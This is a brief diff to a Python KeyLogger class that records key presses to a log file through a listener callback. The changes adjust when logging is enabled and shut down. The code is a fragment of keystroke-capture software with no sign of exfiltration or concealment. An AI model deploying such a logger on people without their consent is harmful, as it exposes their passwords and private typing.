@@ -37,12 +37,14 @@ class KeyLogger:
         """
         Starts logging key presses
         """
+        
         self.stop_flag = False
         
         # Initialize listener
         self.listener = Listener(on_press=self._keypress_callback)
         
         # logging config
+        logging.disable(logging.NOTSET)
         logging.basicConfig(filename=(self.keylog_filename), level=logging.DEBUG, format='%(asctime)s: %(message)s')
         
         self.listener.start()
@@ -52,5 +54,7 @@ class KeyLogger:
         """
         Stops logging key pressed
         """
+        # Disable logging calls
+        logging.shutdown()
         
         self.listener.stop()
